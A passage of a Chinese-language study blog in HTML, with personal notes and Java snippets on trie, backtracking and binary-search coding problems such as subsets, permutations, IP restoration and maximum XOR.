title="062、实现前缀树（208、9月16日）"></a>062、实现前缀树（208、9月16日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，前缀树。定义前缀树节点时，可以将其children指针指向长度为<span class="number">26</span>的TrieNode数组，因为前缀树一般考察小写字母，此外，维护一个布尔标志位，表示路径截止到该字符是否为字符串。本题需要先定义静态前缀树节点类，在insert、search和startsWith方法实现时，根据children指针遍历路径时，记住根节点是空的，还有children数组中不为<span class="literal">null</span>的单元即代表有效字母即可。（关键词，定义TrieNode）</span><br></pre></td></tr></table></figure><h3 id="063、替换单词（648、9月17日）"><a href="#063、替换单词（648、9月17日）" class="headerlink" title="063、替换单词（648、9月17日）"></a>063、替换单词（648、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，前缀树。用前缀树解决问题分为两步，第一步是创建前缀树，第二步是在前缀树中查找。</span><br><span class="line">创建前缀树时，</span><br><span class="line">遍历前缀树，当children对应字母指针为<span class="literal">null</span>时，在该字母指针上添加新节点，遍历晚字符串将当前节点isWord标志位设置为<span class="literal">null</span>。注意，对于字典中的每个字符串，都是从root节点开始遍历前缀树，每到新字符串要将node指向root；</span><br><span class="line">在前缀树中查找时，通过StringBuilder累积路径，当isWord标志位为<span class="literal">true</span>说明是最短前缀，或者children对应字母指针为<span class="literal">null</span>说明不存在前缀，这时候跳出循环并根据条件返回。</span><br><span class="line">在主函数中，通过以下api分割和组合字符串：</span><br><span class="line"> String[] units = sentence.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> String.join(<span class="string">&quot; &quot;</span>,units);</span><br></pre></td></tr></table></figure><h3 id="064、神奇的字典（676、9月17日）"><a href="#064、神奇的字典（676、9月17日）" class="headerlink" title="064、神奇的字典（676、9月17日）"></a>064、神奇的字典（676、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，前缀树。创建前缀树逻辑如旧。在前缀树中查找时，显然是用递归。每次访问新的字母时，尝试当前节点的<span class="number">26</span>个children字母指针，并根据是否为当前字母，决定“已修改次数标志位”是否加<span class="number">1</span>，并继续递归。对于我目前水平来说，还是不熟悉dfs方法传参和返回值的设计：</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(TrieNode root,String word,<span class="type">int</span> i,<span class="type">int</span> edit)</span>  <span class="comment">//传参新节点，word，当前字母位置，修改次数</span></span><br><span class="line">需要考虑的情况：</span><br><span class="line">    a.<span class="literal">false</span>边界：root为<span class="literal">null</span>，说明不存在该字母指针，即字典不存在该单词；</span><br><span class="line">    b.<span class="literal">true</span>边界：当前字母位置i走到尽头，root是单词，已经修改一次；</span><br><span class="line">    c.当前字母位置i没有走到尽头，且标志位修改小于等于<span class="number">1</span>次，继续递归；</span><br><span class="line">    d.方法边界：其他情况都返回<span class="literal">false</span>，<span class="literal">true</span>只有“<span class="literal">true</span>边界”那一种情况；</span><br><span class="line">    （关键词，dfs）</span><br></pre></td></tr></table></figure><h3 id="065、最短的单词编码（820、9月17日）"><a href="#065、最短的单词编码（820、9月17日）" class="headerlink" title="065、最短的单词编码（820、9月17日）"></a>065、最短的单词编码（820、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>题目解释，这道题是给出单词数组words，但希望换成字符串s表示，并且字符串尽可能短。要求words[i]在s中以#结束，故不能考虑前缀重合，这时候就需要把一些尾缀相同的words[i]联合起来，但是为了表明words[i]在s中的开始位置，就用indices[i]索引words[i]的开始位置。题目答案要给出最短的字符串s长度。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，前缀树。将words中的单词逆序生成前缀树，实际维护了后缀相同的单词，此时要查询生成最短字符串的长度。对字符串a和b来说，如果a恰被淹没在b的路径里，那么只需累加b的长度；如果a和b只是部分前缀重合，那么a和b的长度都需要累加，这样能发现，最短字符串即全部叶子节点到root节点的路径。由于只需要统计长度，那就递归即可。dfs函数的设计还是很巧妙：</span><br><span class="line">    a.先将标志位isLeaf设置为<span class="literal">true</span>；</span><br><span class="line">    b.遍历<span class="number">26</span>个字母指针，如果指针不指向<span class="literal">null</span>，继续递归，并把标志位修改为<span class="literal">false</span>；</span><br><span class="line">    c.继而判断标志位是否为<span class="literal">true</span>，如果为<span class="literal">true</span>说明没有修改，即children指针均指向<span class="literal">null</span>，是叶子节点，此时累加长度；</span><br><span class="line">    初始化length为<span class="number">1</span>，即root节点（空节点）为<span class="number">1</span>，第一个节点时length为<span class="number">2</span>，满足“第一个字母#”长度为<span class="number">2</span>的要求。（关键词，dfs）</span><br><span class="line"><span class="number">3.</span>前缀树中dfs用标志位判断是否为叶子节点，不用root==<span class="literal">null</span>，因为大多数children指针确实为<span class="literal">null</span>。</span><br></pre></td></tr></table></figure><h3 id="066、单词之和（677、9月17日）"><a href="#066、单词之和（677、9月17日）" class="headerlink" title="066、单词之和（677、9月17日）"></a>066、单词之和（677、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashMap+前缀树。维护一个HashMap&lt;String,Integer&gt;和一个前缀树。insert方法把新键值插入hashMap的同时，还要把新键加入到前缀树中。这里重点说sum方法，是我为数不多自己实现回溯：</span><br><span class="line">    先通过prefix字符串遍历到最后的节点，并将prefix加入StringBuilder，进入dfs函数：</span><br><span class="line">     dfs(TrieNode node,<span class="type">int</span>[] sum,StringBuilder builder,<span class="type">int</span> index)</span><br><span class="line">    a.遍历当前节点node的<span class="number">26</span>个字母指针，如果不为<span class="literal">null</span>，将builder增加当前字母，并放入dfs继续递归，传入下一层字符的索引值index+<span class="number">1</span>，回溯时再在builder中删除当前字母；注意index初始为prefix长度，而不是<span class="number">0</span>；</span><br><span class="line">    b.如果当前节点为单词，将builder转化为字符串，从hashMap中根据键取值，并累积到最终结果；（关键词，dfs+hashMap）</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，前缀树。相比我的想法改进在，如果一个节点对应一个字符串的最后一个字符，那么该节点的整数字段的值就设为字符串的值，否则设为<span class="number">0</span>；这时候需要修改TrieNode定义，不再需要<span class="type">boolean</span>标志位isWord，而是整数值value。</span><br></pre></td></tr></table></figure><h3 id="067、最大的异或（421、9月17日）"><a href="#067、最大的异或（421、9月17日）" class="headerlink" title="067、最大的异或（421、9月17日）"></a>067、最大的异或（421、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，暴力破解。双层<span class="keyword">for</span>循环遍历，Math.max(value,nums[i]^nums[j])，然而超时了。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，前缀树。因为对于整数异或位运算，相异为<span class="number">1</span>，相同为<span class="number">0</span>，为使结果数值更大，应该尽量高位为<span class="number">1</span>。故构建前缀树时，高位作为前缀。遍历nums整数数组时，从高位开始遍历当前数字num的<span class="number">32</span>位，看前缀树是否有与当前位不同的位，</span><br><span class="line">    a.如果有则将node节点优先移动到该位，并将结果的该位置为<span class="number">1</span>；  xor = (xor&lt;&lt;<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">    b.没有则移动到相同位，并将结果的该位置为<span class="number">0</span>；  xor = xor&lt;&lt;<span class="number">1</span>;</span><br><span class="line">当前数字num按位访问结束后，通过Math.max(max,xor)更新结果值。（关键词，高位前缀树取不同）</span><br><span class="line">        </span><br><span class="line"><span class="number">3.</span>回忆整数章节技巧：</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">31</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> (num&gt;&gt;i)&amp;<span class="number">1</span>;   <span class="comment">//从32位整数高位开始，右移i位，每次只保留末尾位</span></span><br></pre></td></tr></table></figure><h3 id="总结之前缀树"><a href="#总结之前缀树" class="headerlink" title="总结之前缀树"></a>总结之前缀树</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>前缀树定义：</span><br><span class="line">前缀树是一棵多叉树，一个节点可能有多个子节点。前缀树中除根节点外，每个节点表示字符串中的一个字符，而字符串由前缀树的路径表示。例如，“can”和“cat”前两个字符相同，它们在前缀树对应的两条路径中最开始的<span class="number">3</span>个节点重叠（根节点，<span class="string">&#x27;c&#x27;</span>和<span class="string">&#x27;a&#x27;</span>）。</span><br><span class="line"><span class="number">2.</span>前缀树主要用来解决字符串查找相关的问题，一般题目要求根据字符串的前缀进行查找。用前缀树解决问题分为两步，第一步是创建前缀树，第二步是在前缀树中查找。这部分需要熟练TrieNode节点定义、创建前缀树经典代码这<span class="number">2</span>步惯性操作，查找通常用dfs比较多样。</span><br><span class="line"><span class="number">3.</span>可以按需求修改TrieNode定义，比如增加字段<span class="type">int</span> value，记录单词对应的值。</span><br><span class="line">    </span><br><span class="line"><span class="number">4.</span>越来越觉得，递归、回溯以及dfs方法要从四个方向考虑：<span class="literal">false</span>边界、<span class="literal">true</span>边界、继续递归条件和方法边界，而传参和返回值看代码需要什么，是后面才补充的。这部分还是不太熟练。</span><br><span class="line"><span class="number">5.</span>前缀树中dfs用标志位判断是否为叶子节点，不用root==<span class="literal">null</span>，因为大多数children指针确实为<span class="literal">null</span>。</span><br></pre></td></tr></table></figure><h2 id="第十三章、回溯法"><a href="#第十三章、回溯法" class="headerlink" title="第十三章、回溯法"></a>第十三章、回溯法</h2><h3 id="079、所有子集（78、9月18日）"><a href="#079、所有子集（78、9月18日）" class="headerlink" title="079、所有子集（78、9月18日）"></a>079、所有子集（78、9月18日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。从左到右遍历整数数组nums，用subSet记录当前集合。遍历到每个元素时，可以选择不放入当前元素继续递归；或者将当前元素放入subSet后继续递归，递归结束将元素从当前集合删除。当遍历深度达到数组长度，则将subSet纳入结果。这道题需要注意：</span><br><span class="line">a.使用LinkedList，在删除元素时用removeLast方法；而不是使用List，删除元素时用remove(index)。这是因为，假设当前index为<span class="number">2</span>，subSet=[<span class="number">3</span>]，即前两次加的都是空，这样remove(<span class="number">2</span>)时就会越界，为了恢复状态应该用removeLast方法；</span><br><span class="line">b.双层List嵌套结果，需要用下面的方式放入结果。如果直接result.add(subSet)，后面再操作subSet时，会改变result中subSet值：</span><br><span class="line">result.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(subSet));</span><br><span class="line">（关键词，回溯经典）</span><br></pre></td></tr></table></figure><h3 id="080、含有k个元素的组合（77、9月18日）"><a href="#080、含有k个元素的组合（77、9月18日）" class="headerlink" title="080、含有k个元素的组合（77、9月18日）"></a>080、含有k个元素的组合（77、9月18日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。显然不能穷举，k为多少就设多少层循环，应该传index回溯。这道题和上一道逻辑相同，因为需要提取k个数，所以外界判断subSet是否到达k，达到则纳入结果；当没有到达k时，有两种选择，可以选择不放入当前元素继续递归，给其他元素一个机会；或者将当前元素放入subSet后继续递归，递归结束将元素从当前集合删除。需注意当前元素不可越界，越界后会走不到判断逻辑并返回，不会继续越界。</span><br><span class="line">     <span class="keyword">if</span>(subSet.size()==k)&#123;</span><br><span class="line">            results.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(subSet));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(start&lt;=n)&#123;</span><br><span class="line">                dfs(n,k,start+<span class="number">1</span>,subSet,results);</span><br><span class="line">                </span><br><span class="line">                subSet.add(start);</span><br><span class="line">                dfs(n,k,start+<span class="number">1</span>,subSet,results);</span><br><span class="line">                subSet.removeLast();</span><br><span class="line">            &#125;</span><br><span class="line">     &#125;</span><br><span class="line">（关键词，回溯经典）</span><br></pre></td></tr></table></figure><h3 id="081、允许重复选择元素的组合（39、9月19日）"><a href="#081、允许重复选择元素的组合（39、9月19日）" class="headerlink" title="081、允许重复选择元素的组合（39、9月19日）"></a>081、允许重复选择元素的组合（39、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。做完前几道有点进步了，按照惯性思路完成本题。dfs函数设计如下，index用于定位当前数字，sum是当前累积和，subSet是本集合，results是最终结果集合。</span><br><span class="line">dfs(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> index, <span class="type">int</span>[] sum, LinkedList&lt;Integer&gt; subSet,List&lt;List&lt;Integer&gt;&gt; results)</span><br><span class="line">dfs逻辑为，当前累计和sum小于target时，有两种选择：</span><br><span class="line">    a.index加一，不访问本索引数字，直接递进下个数字的dfs；</span><br><span class="line">    b.subSet和sum都累加本索引数字，index不变进入下一轮dfs，dfs结束后subSet和sum恢复原状，这样涵盖了多次使用一个数字的情况；</span><br><span class="line">当前累积和sum等于target时，将本集合subSet纳入结果；超过target则没有逻辑自动返回；</span><br><span class="line">（关键词，重复不加）</span><br></pre></td></tr></table></figure><h3 id="082、含有重复元素集合的组合（40、9月19日）"><a href="#082、含有重复元素集合的组合（40、9月19日）" class="headerlink" title="082、含有重复元素集合的组合（40、9月19日）"></a>082、含有重复元素集合的组合（40、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。经过题解点拨，“避免重复组合的方法是，当在某一步决定跳过某个值为m的数字时，跳过所有值为m的数字”。因此dfs逻辑为，当前累积和sun小于target时只有一种选择：</span><br><span class="line">subSet和sum都累加本索引数字，index加一，进入下一轮dfs，dfs结束后subSet和sum恢复原状，这样就不会使用某元素多次；</span><br><span class="line">但是，需要解决不同位置、值相同元素造成的结果重复。这时候，可以先通过Arrays.sort(candidates)排序初始数组，遍历到某数字时，如果下一数字等于本数字，就不断自增index直到不同的数字再dfs。（关键词，要跳全跳）</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>写完才发现完全依靠这句点拨，否则还是难想，辅以示例；比如原始数字集合candidates为[<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>]，某目标subSet为[<span class="number">2</span>,<span class="number">2</span>]，但会有<span class="number">3</span>种重复，用上面的逻辑，决定调<span class="number">2</span>时会跳出所有的<span class="number">2</span>，那么就会排除重复解：</span><br><span class="line">    a.跳过第一个<span class="number">2</span>，保留后两个<span class="number">2</span>；b.跳过中间的<span class="number">2</span>，保留前后的<span class="number">2</span>；</span><br><span class="line">这样，任何对<span class="number">2</span>的需求，都是取靠前位置的<span class="number">2</span>，靠后位置的<span class="number">2</span>不被选择故不会重复。</span><br></pre></td></tr></table></figure><h3 id="083、没有重复元素集合的全排列（46、9月19日）"><a href="#083、没有重复元素集合的全排列（46、9月19日）" class="headerlink" title="083、没有重复元素集合的全排列（46、9月19日）"></a>083、没有重复元素集合的全排列（46、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。题解的思路基于示例更好说明，假设输入集合[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]，对于第一个位置，这<span class="number">3</span>个数字都有可能；对于第二个位置，只有<span class="number">2</span>个数字有可能；第三个位置已经没得选择。dfs函数设计如下：</span><br><span class="line">    a.当索引i达到数组长度时，将当前数组转换为List并纳入结果；</span><br><span class="line">    b.当索引i还没有达到数组长度时，从i开始，后面的每个数字都可以与i位置数字交换，i自增后进入下一轮dfs，dfs结束后将i位置和j位置数字交换回来；</span><br><span class="line">这种思路，每次交换到前面的数字都不再被访问，随着i的增加后面位置情况减少。</span><br><span class="line">（关键词，回溯交换）</span><br></pre></td></tr></table></figure><h3 id="084、含有重复元素集合的全排列（47、9月19日）"><a href="#084、含有重复元素集合的全排列（47、9月19日）" class="headerlink" title="084、含有重复元素集合的全排列（47、9月19日）"></a>084、含有重复元素集合的全排列（47、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。当索引i还没有到达数组长度时，从i开始，后面的每个数字只有与位置i的数字不同，都可以与i位置数字交换，其他步骤同第<span class="number">83</span>题。但是，有很多测试用例没通过。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，回溯法。观察题解发现，这里不能只判断“后面的每个数字只有与位置i的数字不同”，还有如果某数字已经与位置i的数字交换，那么与其值相同的数字就不应该再与位置i的数字交换。比如数组[<span class="number">1</span>,<span class="number">2</span>,i=<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>]，这时候第二个<span class="number">3</span>不应该交换，第二个<span class="number">5</span>也不应该交换。</span><br><span class="line">（关键词，回溯交换+hashSet）</span><br></pre></td></tr></table></figure><h3 id="085、生成匹配的括号（22、9月19日）"><a href="#085、生成匹配的括号（22、9月19日）" class="headerlink" title="085、生成匹配的括号（22、9月19日）"></a>085、生成匹配的括号（22、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。这应该是第二次做这道题，虽然间隔很久，但是还是做出来了。思路就是，通过StringBuilder增加‘(’字符，进入下一轮dfs，dfs结束后将该字符从builder中移除，再同样操作‘)’字符。当递进深度达到<span class="number">2</span>*n时，判断字符串是否为有效括号，有效则纳入结果。</span><br><span class="line">    判断有效括号： ‘(’字符时压栈，‘)’字符时弹栈，弹栈时如果栈为空则<span class="literal">false</span>，全部字符遍历结束则返回<span class="literal">true</span>。</span><br><span class="line">但是，只击败了<span class="number">5</span>%的同学，肯定不是最优解了。  （关键词，先递进再判断）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，回溯法。相比我的优点是，不用专门判断括号是否有效。由于只存在圆括号“()”，那只需注意两点：</span><br><span class="line">    a.‘(’括号和‘)’括号，数目都不能超过n；</span><br><span class="line">    b.为满足括号匹配，任意时刻左括号数目 &gt;= 右括号数目；</span><br><span class="line">因此，当left&lt;n时，dfs进入left+<span class="number">1</span>；当left&gt;right时，dfs进入right+<span class="number">1</span>。  （关键词，left&gt;=n）</span><br></pre></td></tr></table></figure><h3 id="086、分割回文字符串（131、9月20日）"><a href="#086、分割回文字符串（131、9月20日）" class="headerlink" title="086、分割回文字符串（131、9月20日）"></a>086、分割回文字符串（131、9月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。从start开始遍历，如果从start开始到i结束(包括i)的字符串为回文字符串，那就通过s.substring(start,i+<span class="number">1</span>)把这段字符串切割出来，从(i+<span class="number">1</span>)进入下一轮dfs，dfs结束后将该段字符串删除。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=start;i&lt;s.length();i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(isPara(s,start,i))&#123;</span><br><span class="line">判断回文字符串的isPara方法，是用双指针实现，通过<span class="keyword">while</span>确定左右两指针是否相遇，在这一过程对比字符。又是只击败了<span class="number">5</span>%，可能还是最后双层List&lt;List&lt;String&gt;&gt; 转 String[][]的步骤太耗费时间。</span><br><span class="line">    （关键词，先判断后递进）</span><br><span class="line"><span class="number">2.</span>双层List&lt;List&lt;String&gt;&gt; 转 String[][]，内层不定长时的coding技巧：</span><br><span class="line">    String[][] finals = <span class="keyword">new</span> <span class="title class_">String</span>[results.size()][];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;results.size();i++)&#123;</span><br><span class="line">        List&lt;String&gt; list = results.get(i);</span><br><span class="line">        finals[i] = list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[list.size()]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="087、复原IP（93、9月20日）"><a href="#087、复原IP（93、9月20日）" class="headerlink" title="087、复原IP（93、9月20日）"></a>087、复原IP（93、9月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。当没有遍历到末尾，且<span class="string">&#x27;.&#x27;</span>字符数量不足<span class="number">3</span>时，对于当前字符有两种选择：</span><br><span class="line">    a.如果seg加当前字符后仍然有效，可以不创建新段，直接seg+ch，并进入下一轮dfs；</span><br><span class="line">    <span class="keyword">if</span>(isAvaliable(seg+ch))</span><br><span class="line">    b.如果<span class="string">&#x27;.&#x27;</span>字符数量小于<span class="number">3</span>，且当前段有字符，可以创建新段<span class="string">&#x27;&#x27;</span>+ch，并在ip上添加当前段seg+<span class="string">&#x27;.&#x27;</span>，再进入下一轮dfs；</span><br><span class="line"><span class="keyword">if</span>(numSplit&lt;<span class="number">3</span>&amp;&amp;seg.length()&gt;<span class="number">0</span>)</span><br><span class="line">这道题的边界条件比较复杂，比较难想到。此外，其isAvaliable方法设计很简洁，即规定范围且要满足<span class="number">0</span>的出现要求：</span><br><span class="line"><span class="keyword">return</span> Integer.parseInt(s)&lt;=<span class="number">255</span>&amp;&amp;(s.equals(<span class="string">&quot;0&quot;</span>)||s.charAt(<span class="number">0</span>)!=<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">这道题解法并没有回溯，更像是所有可能走到头的穷举。估计下次做还是做不出来hhhh</span><br><span class="line">（关键词，先判断后递进）</span><br><span class="line"><span class="number">2.</span>字符串值比较一定要用s.equals(<span class="string">&quot;0&quot;</span>)，而不是s==<span class="string">&quot;0&quot;</span>，这里s是通过<span class="string">&quot;&quot;</span>+ch不断累加得到的。</span><br></pre></td></tr></table></figure><h3 id="总结之回溯法"><a href="#总结之回溯法" class="headerlink" title="总结之回溯法"></a>总结之回溯法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>官方描述提炼：</span><br><span class="line">a.在采用回溯法解决问题时，如果到达树形结构的叶子节点，就找到了问题的一个解；</span><br><span class="line">b.如果在前往某个节点时对问题的解的状态进行了修改，那么在回溯到它的父节点时要记得清除相应的修改；</span><br><span class="line">c.如果明确知道某些子树没有必要遍历，那么在遍历的时候应该避开这些子树以优化效率，这种操作叫剪枝；</span><br><span class="line"><span class="number">2.</span>组合（子集）不看顺序，排列需要注意顺序（排列题目用swap）。</span><br><span class="line"><span class="number">3.</span>LinkedList类有removeLast方法，而ArrayList类并没有，注意多态别List。</span><br><span class="line"><span class="number">4.</span>双层List嵌套结果，需要用下面的方式放入结果。如果直接result.add(subSet)，后面再操作subSet时，会改变result中subSet值：</span><br><span class="line">result.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(subSet));</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>回溯法dfs函数的经典结构（组合问题）：</span><br><span class="line">    <span class="keyword">if</span>(subSet.size()==k)&#123;</span><br><span class="line">            results.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(subSet));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(start&lt;=n)&#123;</span><br><span class="line">                dfs(n,k,start+<span class="number">1</span>,subSet,results);</span><br><span class="line">                </span><br><span class="line">                subSet.add(start);</span><br><span class="line">                dfs(n,k,start+<span class="number">1</span>,subSet,results);</span><br><span class="line">                subSet.removeLast();</span><br><span class="line">            &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="number">6.</span>避免重复组合的方法是，当在某一步决定跳过某个值为m的数字时，跳过所有值为m的数字。</span><br><span class="line">    <span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> index;</span><br><span class="line">    <span class="keyword">while</span>(step+<span class="number">1</span>&lt;candidates.length&amp;&amp;candidates[step+<span class="number">1</span>] == candidates[step])&#123;</span><br><span class="line">        step += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(candidates, target, step + <span class="number">1</span>, sum, subSet, results);</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>双层List&lt;List&lt;String&gt;&gt; 转 String[][]，内层不定长时的coding技巧：</span><br><span class="line">    String[][] finals = <span class="keyword">new</span> <span class="title class_">String</span>[results.size()][];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;results.size();i++)&#123;</span><br><span class="line">        List&lt;String&gt; list = results.get(i);</span><br><span class="line">        finals[i] = list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[list.size()]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>适合回溯法的问题的一个特点是解决这个问题存在多个解，而且题目往往要求列出所有的解。</span><br></pre></td></tr></table></figure><h2 id="第十一章、二分查找"><a href="#第十一章、二分查找" class="headerlink" title="第十一章、二分查找"></a>第十一章、二分查找</h2><h3 id="068、查找插入位置（35、9月23日）"><a href="#068、查找插入位置（35、9月23日）" class="headerlink" title="068、查找插入位置（35、9月23日）"></a>068、查找插入位置（35、9月23日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，穷举。从左到右遍历数组，如果当前数字大于等于目标值，返回当前索引；否则遍历结束后，返回数组长度，即目标值应该插入有序数组的最后一位。（关键词，穷举）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二分查找。经典的二分查找代码，维护left和right双指针，当left&lt;=right时，每轮取中间与目标值比较，根据大小关系决定移动哪个指针，下一轮遍历哪半部分。其中，left等于right是因为，长度为<span class="number">1</span>的子数组也是有效范围。</span><br><span class="line">    稍有不同的是，指针越界则返回left指针，说明上一轮指针重合，target恰好介于二者之间。</span><br></pre></td></tr></table></figure><h3 id="069、山峰数组的顶部（852、9月23日）"><a href="#069、山峰数组的顶部（852、9月23日）" class="headerlink" title="069、山峰数组的顶部（852、9月23日）"></a>069、山峰数组的顶部（852、9月23日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，穷举+标志位。维护一个整型标志位flagIndex，记录山峰位置索引。从索引<span class="number">1</span>开始，从左到右遍历数组，如果当前值大于上一个值，就更新flagIndex，否则跳出循环，返回结果flagIndex。本题简单是因为输入是标准的山峰数组。（关键词，标志位）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二分查找。经典二分查找代码，但不知道如何维护边界。因为山峰的范围在[<span class="number">1</span>,length-<span class="number">2</span>]，故左指针从<span class="number">1</span>开始，右指针从（length-<span class="number">1</span>）开始，其他不变。（关键词，山峰边界）</span><br></pre></td></tr></table></figure><h3 id="070、排序数组中只出现一次的数字（540、9月23日）"><a href="#070、排序数组中只出现一次的数字（540、9月23日）" class="headerlink" title="070、排序数组中只出现一次的数字（540、9月23日）"></a>070、排序数组中只出现一次的数字（540、9月23日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，穷举+标志位。维护一个整型标志位flag，记录当前遍历节点。因为是有序列表，如果本元素和前元素相等，就将flag恢复为Integer.MIN_VALUE，如果不相等，则返回上一元素。遍历到新数字时，如果flag等于Integer.MIN_VALUE，说明前两元素相等并清空了flag，这时候要将flag设置为本数字，避免本数字为最后的数字。（关键词，标志位）</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二分查找。对于<span class="number">3</span>前面的每个数对如(<span class="number">1</span>,<span class="number">1</span>)，第一个数是偶数；对于<span class="number">3</span>后面的每个数对如(<span class="number">4</span>,<span class="number">4</span>)，第一个数是奇数。因此，每次取到偶数mid时，如果nums[mid] == nums[mid + <span class="number">1</span>]说明mid是在<span class="number">3</span>之前，就移动左指针到mid+<span class="number">2</span>（下一个偶数），反之移动右指针到mid。（关键词，索引奇偶性找规律）</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>]</span><br><span class="line">    [偶,奇,偶,奇,偶,奇,偶,奇,偶]</span><br><span class="line">    （二分查找看了几遍，没做出来）</span><br></pre></td></tr></table></figure><h3 id="071、按权重生成随机数（528、9月26日）"><a href="#071、按权重生成随机数（528、9月26日）" class="headerlink" title="071、按权重生成随机数（528、9月26日）"></a>071、按权重生成随机数（528、9月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，前缀和+二分查找。这道题要求按权重获取随机数，题解思路的精妙之处，在于维护一个前缀和数组，比如权重[<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>]，维护一个前缀和数组[<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">12</span>],从[<span class="number">1</span>,<span class="number">12</span>]的范围里通过random API平均取随机数，如果取到<span class="number">9</span>，就对应取到前缀和数组中的索引<span class="number">3</span>，这样就实现了下标按权重随机获取。Solution构造方法初始化前缀和数组，pickIndex方法[<span class="number">0</span>,权重总和]随机获取值后，在前缀和数组里二分查找获取索引。</span><br><span class="line">    （关键词，前缀和数组）</span><br><span class="line"><span class="number">2.</span>本题数组中存着前缀和，因此要在[<span class="number">1</span>,total]中随机取值</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Random</span>.nextInt(total);  <span class="comment">//在[0,total-1]中随机取值</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Random</span>.nextInt(total)+<span class="number">1</span>;  <span class="comment">//在[1,total]中随机取值</span></span><br></pre></td></tr></table></figure><h3 id="072、求平方根（69、9月25日）"><a href="#072、求平方根（69、9月25日）" class="headerlink" title="072、求平方根（69、9月25日）"></a>072、求平方根（69、9月25日）</h3><figure class="highlight 